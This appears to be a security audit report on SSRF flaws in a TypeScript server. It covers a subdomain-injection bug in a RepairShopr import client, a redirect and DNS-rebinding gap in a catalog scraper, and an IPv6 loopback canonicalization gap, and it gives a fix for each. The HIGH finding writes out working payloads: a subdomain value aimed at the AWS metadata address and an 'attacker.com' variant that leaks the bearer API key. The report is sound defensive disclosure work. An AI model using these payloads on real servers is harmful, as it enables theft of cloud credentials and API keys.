# S15 — Server-Side Request Forgery (SSRF)

## Summary

| SEV | Count | Title |
|-----|-------|-------|
| HIGH | 1 | RepairShopr subdomain parameter enables SSRF to internal networks + credential exfiltration |
| LOW | 1 | catalogScraper uses `assertPublicUrl` then raw `fetch()` without `redirect: 'error'` |
| INFO | 1 | `isPrivateIPv6` does not canonicalize expanded-form IPv6 addresses (not exploitable in practice) |

---

### [HIGH] RepairShopr subdomain injection enables SSRF to internal hosts and AWS IMDS

**Where:** `packages/server/src/services/repairShoprImport.ts:104` — caller: `packages/server/src/routes/import.routes.ts:607–615`

**What:**
The `RsApiClient` constructor interpolates the admin-supplied `subdomain` string directly into a URL without any format validation: `this.baseUrl = \`https://${subdomain}.repairshopr.com/api/v1\``. An admin can supply a subdomain value containing `@` and `#` characters to hijack the URL's authority component, redirecting the outbound connection to an arbitrary host. The URL string `https://x@169.254.169.254#.repairshopr.com/api/v1/customers?page=1` parses as hostname `169.254.169.254` (AWS IMDS link-local), username `x`. No SSRF guard (`assertPublicUrl` / `fetchWithSsrfGuard`) is called anywhere in the import service. The HTTP request also forwards the operator's RepairShopr API key in `Authorization: Bearer <KEY>` to whichever host the URL resolves to, constituting credential exfiltration.

**Code:**
```typescript
// repairShoprImport.ts:102-112
constructor(apiKey: string, subdomain: string, tenantSlug?: string) {
  this.apiKey = apiKey;
  this.baseUrl = `https://${subdomain}.repairshopr.com/api/v1`; // NO validation
  this.tenantSlug = tenantSlug || 'default';
}

async testConnection() {
  const url = `${this.baseUrl}/customers?page=1`;
  const resp = await fetch(url, {   // NO assertPublicUrl, NO redirect:'error'
    headers: { 'Authorization': `Bearer ${this.apiKey}` },
```

**Exploit:**
An authenticated admin POSTs `{ "api_key": "...", "subdomain": "x@169.254.169.254#" }` to `POST /api/v1/import/repairshopr/test-connection`. The server constructs `https://x@169.254.169.254#.repairshopr.com/api/v1/customers?page=1`, which the URL parser resolves to host `169.254.169.254`. The server then fetches the AWS EC2 Instance Metadata Service, receiving cloud credentials, while simultaneously forwarding the operator's API key to the attacker-controlled host (if `#` is replaced by `@attacker.com#`). Similarly, `subdomain="x@127.0.0.1#"` reaches localhost services.

**Fix:**
Add a DNS-label format check on `subdomain` before constructing the URL (e.g., `/^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$/i`), mirroring the `buildRecordName` guard already in `cloudflareDns.ts:62–66`. Additionally, call `await assertPublicUrl(url)` (or use `fetchWithSsrfGuard`) before every outbound fetch in `RsApiClient`, and set `redirect: 'error'` on the `fetch` options.

---

### [LOW] catalogScraper follows redirects after assertPublicUrl — DNS rebinding and redirect bypass window

**Where:** `packages/server/src/services/catalogScraper.ts:414–417`

**What:**
`fetchSearchPage` calls `assertPublicUrl(url)` to validate the resolved IP, then immediately issues a separate `fetch(url, ...)` call without `redirect: 'error'` and without pinning the IP via `fetchWithSsrfGuard`. Two weaknesses follow. First, the SSRF guard's comment (`ssrfGuard.ts:17–19`) explicitly notes that the re-DNS-resolution at connect time opens a DNS rebinding window: an attacker-controlled supplier domain could flip its DNS answer to a private IP between guard time and connect time. Second, because `redirect` defaults to `'follow'`, a 3xx redirect from the supplier's origin to an internal address (e.g. if `mobilesentrix.com` were compromised) would deliver the internal response to the scraper without triggering the guard.

**Code:**
```typescript
// catalogScraper.ts:414-417
const { assertPublicUrl } = await import('../utils/ssrfGuard.js');
await assertPublicUrl(url);   // validates once via DNS

// Raw fetch — OS re-resolves DNS, follows redirects
const res = await fetch(url, { headers: REQUEST_HEADERS, signal: AbortSignal.timeout(15000) });
```

**Exploit:**
Requires compromising the DNS of `mobilesentrix.com` or `phonelcdparts.com` (not admin-reachable, but a supply-chain attack vector). A supplier with a TTL of 0 could flip its DNS answer to `169.254.169.254` after the guard check and before the fetch's TCP connect. The redirect path: a compromised supplier server returns `301 http://169.254.169.254/latest/meta-data/` and the scraper fetches it.

**Fix:**
Replace the two-step `assertPublicUrl` + `fetch` with `fetchWithSsrfGuard(url, { timeoutMs: 15000, redirect: 'error' })` from `ssrfGuard.ts:190`. This pins the connection to the pre-validated IP (closing the rebind window) and disables redirect-following.

---

### [INFO] isPrivateIPv6 does not canonicalize expanded-form IPv6 addresses

**Where:** `packages/server/src/utils/ssrfGuard.ts:67–102`

**What:**
`isPrivateIPv6` performs string equality checks against `'::1'` and prefix-regex matches, but does not canonicalize fully-expanded IPv6 addresses like `0:0:0:0:0:0:0:1` (which is equivalent to `::1`) before checking. If `isPrivateIPv6` were called directly with a non-compressed loopback string, it would return `false` and the guard would consider the address public. In practice this is not exploitable: `new URL()` normalizes all bracketed IPv6 literals to compressed form (e.g. `[::1]`), and `net.isIP('[::1]') === 0` so the bracketed address falls through to `dns.lookup`, which fails with `ENOTFOUND`. Node's `dns.lookup` also returns normalized, compressed IPv6 strings. The dead path exists as a latent correctness gap.

**Code:**
```typescript
// ssrfGuard.ts:70-71 — only checks the compressed form
if (normalized === '::1') return true;
// No check for '0:0:0:0:0:0:0:1' or '0000:0000:0000:0000:0000:0000:0000:0001'
```

**Exploit:**
Not directly exploitable via the existing call sites (URL parser and dns.lookup both normalize). A future call site that passes raw IPv6 strings from an alternative source (e.g. a response header or a DB value) without URL-parsing first could be vulnerable.

**Fix:**
Before the regex/equality checks, canonicalize the input using `net.isIPv6(ip) ? new URL('http://[' + ip + ']').hostname.slice(1, -1) : ip` or use Node's `dns.promises.lookup(ip, { all: true })` on IP literals to get the normalized form. Alternatively, add a check for the expanded loopback: `if (/^[0:]+1$/.test(normalized)) return true`.

---
